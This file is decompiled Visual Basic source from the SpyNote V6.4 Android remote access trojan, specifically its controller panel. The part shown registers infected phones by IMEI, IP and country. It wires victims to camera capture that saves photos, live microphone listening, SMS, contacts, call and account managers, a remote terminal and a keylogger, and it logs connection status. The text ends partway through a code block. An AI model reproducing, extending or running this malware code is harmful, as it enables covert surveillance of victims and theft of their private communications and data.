Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing.Imaging
Imports System.Globalization
Imports System.IO
Imports System.Media
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Server

Namespace SN
    Public Class Data
        Public Delegate Sub Delegate1(ParametersArray As Array)

        Public Delegate Sub Delegate0(ParametersObject As Object)

        Friend Class Cc
            Public Shared iii As Data.Cc

            Public Shared IRIS As Data.Delegate0

            Shared Sub New()
                Data.Cc.iii = New Data.Cc()
            End Sub
            Friend Sub Lam_191(a0 As Object)
                Data.LogsSpyNote(CType(a0, Array))
            End Sub
        End Class

        Public Shared SpyNote As MainSpyNote

        Public Shared Socket As SocketServer

        Public Shared BytesSent As Long

        Public Shared BytesReceived As Long

        Public Shared SplitData As String

        Public Shared SplitArray As String

        Public Shared SplitLines As String

        Public Shared SplitByte As String

        Public Shared Pass As String

        Public Shared SplitPaths As String

        Public Shared GeoIP0 As GeoIP

        Public Shared PublicPID As Integer

        Public Shared OptionsLines As String()

        Public Shared BoolPass As Boolean

        Public Shared aMedia As SoundPlayer

        Public Shared nNotice As Notice1

        Shared Sub New()
            Data.nNotice = New Notice1()
            Dim flag As Boolean = File.Exists(Store.Resources(1) + "\Audio\v.wav")
            If flag Then
                Data.aMedia = New SoundPlayer()
                Data.aMedia.SoundLocation = Store.Resources(1) + "\Audio\v.wav"
                Data.aMedia.Load()
            End If
            Data.GeoIP0 = New GeoIP(Store.Resources(1) + "\imports\GeoIP\GeoIP.dat")
            Data.BytesSent = 0L
            Data.BytesReceived = 0L
            Data.SplitByte = Store.BFF(Store.buff, 1L)
            Data.SplitData = Store.BFF(Store.buff, 2L)
            Data.SplitLines = Store.BFF(Store.buff, 3L)
            Data.SplitArray = Store.BFF(Store.buff, 4L)
            Data.SplitPaths = Store.BFF(Store.buff, 5L)
            Data.Pass = "null"
            Data.PublicPID = -1
            Data.BoolPass = False
        End Sub

        Public Shared Sub LogsSpyNote(ParametersArray As Array)
            Try
                Dim isDisposed As Boolean = Data.SpyNote.IsDisposed
                If Not isDisposed Then
                    Dim invokeRequired As Boolean = Data.SpyNote.InvokeRequired
                    If invokeRequired Then
                        Dim arg_57_0 As Control = Data.SpyNote
                        Dim arg_57_1 As [Delegate]
                        If Data.Cc.IRIS IsNot Nothing Then
                            arg_57_1 = Data.Cc.IRIS
                        Else
                            Dim expr_47 As Data.Delegate0 = AddressOf Data.Cc.iii.Lam_191
                            arg_57_1 = expr_47
                            Data.Cc.IRIS = expr_47
                        End If
                        arg_57_0.Invoke(arg_57_1, New Array() {ParametersArray})
                    Else
                        Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                        Dim text As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
                        Data.SpyNote.DataLogsView.Rows.Add(New Object() {GetFlagThisIp.GetFlagThisIp(CStr(ParametersArray.GetValue(0))), CStr(ParametersArray.GetValue(1)), CStr(ParametersArray.GetValue(2)), Store.Bitmap_0("Skulls\" + (CStr(ParametersArray.GetValue(3))).Trim()), text, CStr(ParametersArray.GetValue(5)) + Strings.Space(5)})
                        ' The following expression was wrapped in a checked-expression
                        Dim index As Integer = Data.SpyNote.DataLogsView.Rows.Count - 1
                        Dim left As String = CStr(ParametersArray.GetValue(2))
                        If Operators.CompareString(left, "Disconnect", False) <> 0 Then
                            If Operators.CompareString(left, "Connected", False) = 0 Then
                                Data.SpyNote.DataLogsView.Rows(index).Cells(2).Style.ForeColor = Color.FromArgb(78, 201, 155)
                                Data.SpyNote.DataLogsView.Rows(index).Cells(2).Style.SelectionForeColor = Color.FromArgb(78, 201, 155)
                            End If
                        Else
                            Data.SpyNote.DataLogsView.Rows(index).Cells(2).Style.ForeColor = Color.FromArgb(255, 128, 128)
                            Data.SpyNote.DataLogsView.Rows(index).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 128, 128)
                        End If
                    End If
                End If
            Catch expr_267 As Exception
                ProjectData.SetProjectError(expr_267)
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub Data_0(ParametersObject As Object)
            Try
                Dim socketClient As SocketClient = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(ParametersObject), New Object() {0}, Nothing), SocketClient)
                Dim b As Byte() = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(ParametersObject), New Object() {1}, Nothing), Byte())
                Dim flag As Boolean = Not socketClient.gzip
                Dim array As Array
                If flag Then
                    array = Store.SplitByte(b, Data.SplitByte)
                Else
                    array = Store.SplitByte(Store.Decompress(b), Data.SplitByte)
                End If
                Dim flag2 As Boolean = array.Length <> 2
                If Not flag2 Then
                    Dim array2 As String() = Store.Encoding().GetString(CType(array.GetValue(0), Byte())).Split(New String() {Data.SplitData}, StringSplitOptions.None)
                    Dim isDisposed As Boolean = Data.SpyNote.IsDisposed
                    If Not isDisposed Then
                        Dim invokeRequired As Boolean = Data.SpyNote.InvokeRequired
                        If invokeRequired Then
                            Dim args As Object() = New Object() {RuntimeHelpers.GetObjectValue(ParametersObject)}
                            Data.SpyNote.Invoke(New Delegate0(AddressOf Data.Data_0), args)
                        Else
                            Dim flag3 As Boolean = Not socketClient.IsClose
                            If flag3 Then
                                Dim flag4 As Boolean = Not Data.SpyNote.BlackList.Contains(socketClient.ClientAddressIP)
                                If flag4 Then
                                    Dim left As String = array2(0)
                                    Dim flag5 As Boolean = Operators.CompareString(left, Store.BFF(Store.buff, 6L), False) = 0
                                    If flag5 Then
                                        Dim flag6 As Boolean = Operators.CompareString(array2(1).Trim(), "null", False) = 0
                                        If Not flag6 Then
                                            Dim flag7 As Boolean = Operators.CompareString(array2(1).Trim(), Data.Pass, False) <> 0
                                            If flag7 Then
                                                Data.LogsSpyNote(New String() {socketClient.ClientAddressIP, socketClient.ClientRemoteAddress, "Connected", "NotReady", Nothing, "Invalid Password"})
                                                Return
                                            End If
                                        End If
                                        socketClient.Wallpaper = Store.Wallpaper(array2(6).Trim(), 48, 48)
                                        socketClient.Wallpaper.Tag = "Wallpaper"
                                        socketClient.Flag = CType(GetFlagThisIp.GetFlagThisIp(socketClient.ClientAddressIP), Bitmap)
                                        socketClient.Flag.Tag = GetCountryName.GetCountryName(socketClient.ClientAddressIP)
                                        Dim array3 As Array = Store.FindIcon("NetworkStatus", array2(3).Trim())
                                        socketClient.NetworkStatus = Store.Bitmap_0("NetworkStatus\" + CStr(array3.GetValue(0)))
                                        socketClient.NetworkStatus.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(array3.GetValue(1), vbCrLf), array3.GetValue(2))
                                        array3 = Store.FindIcon("Battery", array2(2).Trim())
                                        socketClient.Battery = Store.Bitmap_0("Battery\" + CStr(array3.GetValue(0)))
                                        socketClient.Battery.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(array3.GetValue(1), vbCrLf), array3.GetValue(2))
                                        array3 = Store.FindIcon("Screen", Store.BTT(array2(4).Trim()))
                                        socketClient.Screen = Store.Bitmap_0("Screen\" + CStr(array3.GetValue(0)))
                                        socketClient.Screen.Tag = RuntimeHelpers.GetObjectValue(array3.GetValue(1))
                                        socketClient.ClientImei = array2(10).Trim()
                                        socketClient.ClientName = array2(7).Trim()
                                        Dim flag8 As Boolean = array2(11).Trim().Length > 0
                                        If flag8 Then
                                            Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                                            Dim text As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
                                            Data.SpyNote.DataMonitorAndroidView.Rows.Add(New Object() {socketClient.Flag, socketClient.ClientRemoteAddress, socketClient.ClientName, text, Store.BTTM(array2(11).Trim())})
                                        End If
                                        Try
                                            Dim num As Integer = 0
                                            While Data.SpyNote.DataGridView1.Rows.Count > 0
                                                Dim dataGridViewRow As DataGridViewRow = Data.SpyNote.DataGridView1.Rows(num)
                                                Dim socketClient2 As SocketClient = CType(dataGridViewRow.Tag, SocketClient)
                                                Dim flag9 As Boolean = socketClient2 IsNot Nothing
                                                If flag9 Then
                                                    Dim flag10 As Boolean = Operators.CompareString(socketClient2.ClientImei, socketClient.ClientImei, False) = 0
                                                    If flag10 Then
                                                        Data.SpyNote.DataGridView1.Rows(dataGridViewRow.Index).Cells(0).Tag = "-"
                                                        Data.SpyNote.DataGridView1.Rows(dataGridViewRow.Index).DefaultCellStyle.BackColor = Color.FromArgb(27, 27, 28)
                                                        Exit While
                                                    End If
                                                End If
                                                Dim flag11 As Boolean = num = Data.SpyNote.DataGridView1.Rows.Count - 1
                                                If flag11 Then
                                                    Exit While
                                                End If
                                                num += 1
                                            End While
                                        Catch expr_501 As Exception
                                            ProjectData.SetProjectError(expr_501)
                                            ProjectData.ClearProjectError()
                                        End Try
                                        Data.SpyNote.DataGridView1.Rows.Add(New Object() {socketClient.Wallpaper, socketClient.ClientName, CStr(socketClient.Flag.Tag), socketClient.Flag, socketClient.ClientRemoteAddress, array2(8).Trim().ToUpper(), array2(9).Trim(), socketClient.NetworkStatus, socketClient.Battery, socketClient.Screen, array2(5).Trim() + Strings.Space(5)})
                                        Dim index As Integer = Data.SpyNote.DataGridView1.Rows.Count - 1
                                        Data.SpyNote.DataGridView1.Rows(index).Cells(0).ToolTipText = CStr(socketClient.Wallpaper.Tag)
                                        Data.SpyNote.DataGridView1.Rows(index).Cells(3).ToolTipText = CStr(Operators.ConcatenateObject("Country Flag: ", socketClient.Flag.Tag))
                                        Data.SpyNote.DataGridView1.Rows(index).Cells(7).ToolTipText = CStr(socketClient.NetworkStatus.Tag)
                                        Data.SpyNote.DataGridView1.Rows(index).Cells(8).ToolTipText = CStr(socketClient.Battery.Tag)
                                        Data.SpyNote.DataGridView1.Rows(index).Cells(9).ToolTipText = CStr(socketClient.Screen.Tag)
                                        Dim text2 As String = Store.Resources(1) + "\Clients"
                                        Dim directory As String = String.Concat(New String() {text2, "\", socketClient.ClientName, "_", socketClient.ClientImei})
                                        While True
                                            Dim flag12 As Boolean = Not My.Computer.FileSystem.DirectoryExists(text2)
                                            If flag12 Then
                                                My.Computer.FileSystem.CreateDirectory(text2)
                                            Else
                                                Dim flag13 As Boolean = Not My.Computer.FileSystem.DirectoryExists(directory)
                                                If Not flag13 Then
                                                    Exit While
                                                End If
                                                My.Computer.FileSystem.CreateDirectory(directory)
                                            End If
                                        End While
                                        Data.SpyNote.DataGridView1.Rows(index).Tag = socketClient
                                        socketClient.Rows = Data.SpyNote.DataGridView1.Rows(index)
                                        socketClient.TimeOut = True
                                        Data.LogsSpyNote(New String() {socketClient.ClientAddressIP, socketClient.ClientRemoteAddress, "Connected", "Ready", Nothing, "Available"})
                                        Dim name As String = "File_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim file_Manager As File_Manager = CType(My.Application.OpenForms(name), File_Manager)
                                        Dim flag14 As Boolean = file_Manager IsNot Nothing
                                        If flag14 Then
                                            file_Manager.TClient = socketClient
                                            Dim flag15 As Boolean = Not file_Manager.TEXTPATH.Enabled
                                            If flag15 Then
                                                file_Manager.TEXTPATH.Enabled = True
                                            End If
                                        End If
                                        name = "Camera_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim cameraManager As CameraManager = CType(My.Application.OpenForms(name), CameraManager)
                                        Dim flag16 As Boolean = cameraManager IsNot Nothing
                                        If flag16 Then
                                            cameraManager.TClient = socketClient
                                            Dim flag17 As Boolean = Operators.ConditionalCompareObjectEqual(cameraManager.STALAB.Tag, "1", False)
                                            If flag17 Then
                                                cameraManager.StartServiceCamera()
                                            End If
                                        End If
                                        name = "Microphone_404"
                                        Dim microphone As Microphone = CType(My.Application.OpenForms(name), Microphone)
                                        Dim flag18 As Boolean = microphone IsNot Nothing
                                        If flag18 Then
                                            Dim right As String = "Microphone_" + socketClient.ClientName + socketClient.ClientImei
                                            Dim flag19 As Boolean = Operators.ConditionalCompareObjectEqual(microphone.Tag, right, False)
                                            If flag19 Then
                                                microphone.TClient = socketClient
                                                Dim flag20 As Boolean = Operators.ConditionalCompareObjectEqual(microphone.STALAB.Tag, "1", False)
                                                If flag20 Then
                                                    Dim flag21 As Boolean = microphone.pid <> -1
                                                    If flag21 Then
                                                        Data.PublicPID = (If(Store.FindPID(microphone.pid), -1, -2))
                                                    End If
                                                    microphone.Packet = 0L
                                                    microphone.ListenMicrophone()
                                                End If
                                            End If
                                        End If
                                        name = "Location_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim locationManager As LocationManager = CType(My.Application.OpenForms(name), LocationManager)
                                        Dim flag22 As Boolean = locationManager IsNot Nothing
                                        If flag22 Then
                                            locationManager.TClient = socketClient
                                        End If
                                        name = "Calls_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim callsManager As CallsManager = CType(My.Application.OpenForms(name), CallsManager)
                                        Dim flag23 As Boolean = callsManager IsNot Nothing
                                        If flag23 Then
                                            callsManager.TClient = socketClient
                                        End If
                                        name = "Accounts_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim accountManager As AccountManager = CType(My.Application.OpenForms(name), AccountManager)
                                        Dim flag24 As Boolean = accountManager IsNot Nothing
                                        If flag24 Then
                                            accountManager.TClient = socketClient
                                        End If
                                        name = "Contacts_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim contactsManager As ContactsManager = CType(My.Application.OpenForms(name), ContactsManager)
                                        Dim flag25 As Boolean = contactsManager IsNot Nothing
                                        If flag25 Then
                                            contactsManager.TClient = socketClient
                                        End If
                                        name = "SMS_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim sMSManager As SMSManager = CType(My.Application.OpenForms(name), SMSManager)
                                        Dim flag26 As Boolean = sMSManager IsNot Nothing
                                        If flag26 Then
                                            sMSManager.TClient = socketClient
                                            Dim flag27 As Boolean = Not sMSManager.ONLICON.Enabled
                                            If flag27 Then
                                                sMSManager.ONLICON.Enabled = True
                                            End If
                                        End If
                                        name = "Apps_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim apps As Apps = CType(My.Application.OpenForms(name), Apps)
                                        Dim flag28 As Boolean = apps IsNot Nothing
                                        If flag28 Then
                                            apps.TClient = socketClient
                                        End If
                                        name = "chat_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim chat As Chat = CType(My.Application.OpenForms(name), Chat)
                                        Dim flag29 As Boolean = chat IsNot Nothing
                                        If flag29 Then
                                            chat.TClient = socketClient
                                            Dim flag30 As Boolean = Operators.CompareString(chat.MyName, "-1", False) <> 0
                                            If flag30 Then
                                                socketClient.Send(Store.BFF(Store.buff, 30L) + Data.SplitData + chat.MyName)
                                                socketClient.Nickname = chat.MyName
                                            End If
                                        End If
                                        name = "Terminal_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim terminal As Terminal = CType(My.Application.OpenForms(name), Terminal)
                                        Dim flag31 As Boolean = terminal IsNot Nothing
                                        If flag31 Then
                                            terminal.TClient = socketClient
                                            Dim flag32 As Boolean = Conversions.ToBoolean(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(terminal.ViewManager.Rows(terminal.ViewManager.Rows.Count - 1).Cells(1).Tag, "Yes", False)), Operators.CompareObjectEqual(terminal.ViewManager.Rows(terminal.ViewManager.Rows.Count - 1).Cells(0).Tag, "-", False)))
                                            If flag32 Then
                                                terminal.ViewManager.Rows.Add(New Object() {terminal.ViewManager.Rows.Count.ToString(), ""})
                                                terminal.ViewManager.Rows(terminal.ViewManager.Rows.Count - 1).Cells(1).Tag = "Yes"
                                                terminal.inScr = -1
                                            End If
                                        End If
                                        name = "Settings_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim fSettings As FSettings = CType(My.Application.OpenForms(name), FSettings)
                                        Dim flag33 As Boolean = fSettings IsNot Nothing
                                        If flag33 Then
                                            fSettings.TClient = socketClient
                                        End If
                                        name = "key_logger_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim key_logger As key_logger = CType(My.Application.OpenForms(name), key_logger)
                                        Dim flag34 As Boolean = key_logger IsNot Nothing
                                        If flag34 Then
                                            key_logger.TClient = socketClient
                                            Dim flag35 As Boolean = Not key_logger.ThemeButton4.Enabled
                                            If flag35 Then
                                                key_logger.TClient.Send(Store.BFF(Store.buff, 53L) + Data.SplitData)
                                            End If
                                        End If
                                        name = "Call_Phone_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim callPhone As CallPhone = CType(My.Application.OpenForms(name), CallPhone)
                                        Dim flag36 As Boolean = callPhone IsNot Nothing
                                        If flag36 Then
                                            callPhone.TClient = socketClient
                                        End If
                                        name = "Fun_" + socketClient.ClientName + socketClient.ClientImei
                                        Dim fUN As FUN = CType(My.Application.OpenForms(name), FUN)
                                        Dim flag37 As Boolean = fUN IsNot Nothing
                                        If flag37 Then
                                            fUN.TClient = socketClient
                                        End If
                                        Dim checked As Boolean = Data.SpyNote.OnLoginShowAlertToolStripMenuItem.Checked
                                        If checked Then
                                            Dim flag38 As Boolean = Not Data.nNotice.IsDisposed
                                            If flag38 Then
                                                Dim number As Integer = CInt(Math.Round(CDec(Data.SpyNote.imageList_Flags.ImageSize.Width) / 2.0))
                                                Dim format As String = Strings.Space(number) + "IP: {0}" & vbCrLf & "Name: {1}" & vbCrLf & "Model: {2}" & vbCrLf & "Ver & Api: {3}"
                                                Data.nNotice.AddItem(socketClient.Flag, String.Format(format, New Object() {socketClient.ClientAddressIP, socketClient.ClientName, array2(8).Trim(), array2(9).Trim()}))
                                            End If
                                        End If
                                        Dim flag39 As Boolean = Operators.CompareString(Data.OptionsLines(7), "OK", False) = 0
                                        If flag39 Then
                                            Try
                                                Dim isLoadCompleted As Boolean = Data.aMedia.IsLoadCompleted
                                                If isLoadCompleted Then
                                                    Data.aMedia.Play()
                                                End If
                                            Catch expr_FA0 As Exception
                                                ProjectData.SetProjectError(expr_FA0)
                                                ProjectData.ClearProjectError()
                                            End Try
                                        End If
                                    Else
                                        flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 85L), False) = 0)
                                        If flag5 Then
                                            Dim flag40 As Boolean = socketClient.Rows IsNot Nothing
                                            If flag40 Then
                                                socketClient.Wallpaper = Store.Wallpaper(array2(3).Trim(), 48, 48)
                                                socketClient.Wallpaper.Tag = "Wallpaper"
                                                Dim array4 As Array = Store.FindIcon("NetworkStatus", array2(4).Trim())
                                                socketClient.NetworkStatus = Store.Bitmap_0("NetworkStatus\" + CStr(array4.GetValue(0)))
                                                socketClient.NetworkStatus.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(array4.GetValue(1), vbCrLf), array4.GetValue(2))
                                                Dim num2 As Integer = -1
                                                Try
                                                    num2 = (If(array2(5).Trim().ToString().EndsWith("false"), Conversions.ToInteger(array2(5).Trim().ToString().Split(New Char() {"&"c})(0)), -1))
                                                Catch expr_10BC As Exception
                                                    ProjectData.SetProjectError(expr_10BC)
                                                    num2 = -1
                                                    ProjectData.ClearProjectError()
                                                End Try
                                                array4 = Store.FindIcon("Battery", array2(5).Trim())
                                                socketClient.Battery = Store.Bitmap_0("Battery\" + CStr(array4.GetValue(0)))
                                                socketClient.Battery.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(array4.GetValue(1), vbCrLf), array4.GetValue(2))
                                                array4 = Store.FindIcon("Screen", Store.BTT(array2(1).Trim()))
                                                socketClient.Screen = Store.Bitmap_0("Screen\" + CStr(array4.GetValue(0)))
                                                socketClient.Screen.Tag = RuntimeHelpers.GetObjectValue(array4.GetValue(1))
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(9).Value = socketClient.Screen
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(10).Value = array2(2).Trim() + Strings.Space(5)
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(0).Value = socketClient.Wallpaper
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(7).Value = socketClient.NetworkStatus
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(8).Value = socketClient.Battery
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(0).ToolTipText = CStr(socketClient.Wallpaper.Tag)
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(3).ToolTipText = CStr(Operators.ConcatenateObject("Country Flag: ", socketClient.Flag.Tag))
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(7).ToolTipText = CStr(socketClient.NetworkStatus.Tag)
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(8).ToolTipText = CStr(socketClient.Battery.Tag)
                                                Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(9).ToolTipText = CStr(socketClient.Screen.Tag)
                                                Dim flag41 As Boolean = Operators.ConditionalCompareObjectEqual(Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(8).Tag, Nothing, False)
                                                If flag41 Then
                                                    Dim flag42 As Boolean = num2 <> -1 And num2 <= 5
                                                    If flag42 Then
                                                        Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(8).Tag = "OK"
                                                        Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                                                        Dim text3 As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
                                                        Data.SpyNote.DataMonitorAndroidView.Rows.Add(New Object() {socketClient.Flag, socketClient.ClientRemoteAddress, socketClient.ClientName, text3, "Low battery warning !!"})
                                                    End If
                                                Else
                                                    Dim flag43 As Boolean = num2 <> -1 And num2 > 5
                                                    If flag43 Then
                                                        Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(8).Tag = Nothing
                                                    End If
                                                End If
                                                Dim flag44 As Boolean = Operators.ConditionalCompareObjectEqual(Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(7).Tag, Nothing, False)
                                                If flag44 Then
                                                    Dim flag45 As Boolean = Operators.CompareString(array2(4).Trim().ToString(), "w0", False) = 0 Or Operators.CompareString(array2(4).Trim().ToString(), "w1", False) = 0 Or Operators.CompareString(array2(4).Trim().ToString(), "MD2G", False) = 0
                                                    If flag45 Then
                                                        Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(7).Tag = "OK"
                                                        Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                                                        Dim text4 As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
                                                        Data.SpyNote.DataMonitorAndroidView.Rows.Add(New Object() {socketClient.Flag, socketClient.ClientRemoteAddress, socketClient.ClientName, text4, "Weak network signal !!"})
                                                    End If
                                                Else
                                                    Data.SpyNote.DataGridView1.Rows(socketClient.Rows.Index).Cells(7).Tag = Nothing
                                                End If
                                                Dim flag46 As Boolean = Operators.CompareString(array2(6).Trim().ToString(), "-", False) <> 0 And Operators.CompareString(array2(6).Trim().ToString(), "", False) <> 0
                                                If flag46 Then
                                                    Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                                                    Dim text5 As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
                                                    Dim flag47 As Boolean = Operators.CompareString(array2(6).Trim().ToString(), Store.BFF(Store.buff, 109L), False) = 0
                                                    If flag47 Then
                                                        array2(6) = "DOZE-ON"
                                                    Else
                                                        Dim flag48 As Boolean = Operators.CompareString(array2(6).Trim().ToString(), Store.BFF(Store.buff, 110L), False) = 0
                                                        If flag48 Then
                                                            array2(6) = "DOZE-OFF"
                                                        End If
                                                    End If
                                                    Data.SpyNote.DataMonitorAndroidView.Rows.Add(New Object() {socketClient.Flag, socketClient.ClientRemoteAddress, socketClient.ClientName, text5, array2(6).Trim().ToString()})
                                                End If
                                            End If
                                        Else
                                            flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 69L), False) = 0)
                                            If flag5 Then
                                                Dim text6 As String = "Camera_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                Dim cameraManager2 As CameraManager = CType(My.Application.OpenForms(text6), CameraManager)
                                                Dim flag49 As Boolean = cameraManager2 Is Nothing
                                                If flag49 Then
                                                    cameraManager2 = New CameraManager()
                                                    cameraManager2.Name = text6
                                                    cameraManager2.Text = text6
                                                    cameraManager2.TClient = socketClient
                                                    cameraManager2.Show()
                                                End If
                                                cameraManager2.TData(New String() {array2(1).Trim(), array2(2).Trim()})
                                            Else
                                                flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 70L), False) = 0)
                                                If flag5 Then
                                                    Dim flag50 As Boolean = Operators.CompareString(array2(1).Trim(), "null", False) = 0
                                                    If Not flag50 Then
                                                        Dim flag51 As Boolean = Operators.CompareString(array2(1).Trim(), Data.Pass, False) <> 0
                                                        If flag51 Then
                                                            Data.LogsSpyNote(New String() {socketClient.ClientAddressIP, socketClient.ClientRemoteAddress, "Connected", "NotReady", Nothing, "Invalid Password"})
                                                            Return
                                                        End If
                                                    End If
                                                    socketClient.ClientImei = array2(3).Trim()
                                                    socketClient.ClientName = array2(2).Trim()
                                                    Dim name2 As String = "Camera_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                    Dim cameraManager3 As CameraManager = CType(My.Application.OpenForms(name2), CameraManager)
                                                    Dim flag52 As Boolean = cameraManager3 IsNot Nothing
                                                    If flag52 Then
                                                        cameraManager3.STALAB.Enabled = True
                                                        socketClient.gzip = False
                                                        socketClient.TimeOut = True
                                                        cameraManager3.MClient = socketClient
                                                        cameraManager3.StrText1 = "Camera Connected"
                                                        Data.LogsSpyNote(New String() {socketClient.ClientAddressIP, socketClient.ClientRemoteAddress, "Connected Camera", "Ready", Nothing, "Available"})
                                                    Else
                                                        socketClient.Close(False)
                                                    End If
                                                Else
                                                    flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 71L), False) = 0)
                                                    If flag5 Then
                                                        Dim name3 As String = "Camera_Manager_" + socketClient.ClientName + socketClient.ClientImei
                                                        Dim cameraManager4 As CameraManager = CType(My.Application.OpenForms(name3), CameraManager)
                                                        Dim flag53 As Boolean = cameraManager4 IsNot Nothing
                                                        If flag53 Then
                                                            socketClient.gzip = False
                                                            Dim num3 As Long = Conversions.ToLong(If(Versioned.IsNumeric(array2(1).Trim()), array2(1).Trim(), -1))
                                                            Dim flag54 As Boolean = num3 < cameraManager4.Packet
                                                            If Not flag54 Then
                                                                cameraManager4.Packet = num3
                                                                cameraManager4.PreView += 1
                                                                cameraManager4.Lng = CStr(Store.BytesConverter(Conversions.ToLong(NewLateBinding.LateGet(array.GetValue(1), Nothing, "Length", New Object(-1) {}, Nothing, Nothing, Nothing))).GetValue(0))
                                                                Dim buffer As Byte() = CType(array.GetValue(1), Byte())
                                                                Dim stream As MemoryStream = New MemoryStream(buffer)
                                                                Dim bitmap As Bitmap = New Bitmap(Image.FromStream(stream))
                                                                Dim imagee As Image = CType(bitmap.Clone(), Image)
                                                                cameraManager4.TempImage.Image = imagee
                                                                Dim flag55 As Boolean = cameraManager4.NumRotate > 1
                                                                If flag55 Then
                                                                    Dim numRotate As Integer = cameraManager4.NumRotate
                                                                    For i As Integer = 2 To numRotate
                                                                        cameraManager4.RotateFlip(i)
                                                                    Next
                                                                End If
                                                                Dim flag56 As Boolean = Operators.ConditionalCompareObjectEqual(cameraManager4.BTNMUSht.Tag, "1", False)
                                                                If flag56 Then
                                                                    Dim text7 As String = String.Concat(New String() {Store.Resources(1), "\Clients\", cameraManager4.TClient.ClientName, "_", cameraManager4.TClient.ClientImei, "\Camera\Photos"})
                                                                    Dim flag57 As Boolean = Not My.Computer.FileSystem.DirectoryExists(text7)
                                                                    If flag57 Then
                                                                        My.Computer.FileSystem.CreateDirectory(text7)
                                                                    End If
                                                                    Dim flag58 As Boolean = My.Computer.FileSystem.DirectoryExists(text7)
                                                                    If flag58 Then
                                                                        imagee.Save(text7 + "\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg)
                                                                    End If
                                                                End If
                                                                cameraManager4.PBox.Image = cameraManager4.TempImage.Image
                                                                Dim flag59 As Boolean = Not cameraManager4.TProgressBar.Enabled
                                                                If flag59 Then
                                                                    cameraManager4.TProgressBar.Enabled = True
                                                                End If
                                                                Dim flag60 As Boolean = Not cameraManager4.TFPS.Enabled
                                                                If flag60 Then
                                                                    cameraManager4.TFPS.Enabled = True
                                                                End If
                                                            End If
                                                        Else
                                                            socketClient.Close(False)
                                                        End If
                                                    Else
                                                        flag5 = (Operators.CompareString(left, Store.BFF(Store.buff, 67L), False) = 0)
                                                        If flag5 Then
                                                            Dim name4 As String = "Microphone_404"
                                                            Dim text8 As String = "Microphone_" + socketClient.ClientName + socketClient.ClientImei
                                                            Dim microphone2 As Microphone = CType(My.Application.OpenForms(name4), Microphone)
                                                            Dim flag61 As Boolean = microphone2 Is Nothing
                                                            If flag61 Then
                                                                microphone2 = New Microphone()
                                                                microphone2.Name = name4
                                                                microphone2.Text = text8
                                                                microphone2.Tag = text8
                                                                microphone2.TClient = socketClient
                                                                Dim text9 As String = Store.Resources(1) + "\Icons\Microphone\SoundTemplate\Template.png"
                                                                Dim flag62 As Boolean = File.Exists(text9)
                                                                If flag62 Then
                                                                    Dim bitmap2 As Bitmap = New Bitmap(text9)
                                                                    Dim flag63 As Boolean = bitmap2.Height = 128 And bitmap2.Width = 128
                                                                    If flag63 Then
                                                                        microphone2.Bit = bitmap2
                                                                    Else
                                                                        microphone2.Bit = New Bitmap(Store.mWallpaper(array2(3).Trim(), 128, 128))
                                                                    End If
                                                                Else
                                                                    microphone2.Bit = New Bitmap(Store.mWallpaper(array2(3).Trim(), 128, 128))
                                                                End If
                                                                microphone2.Show()
                                                            End If
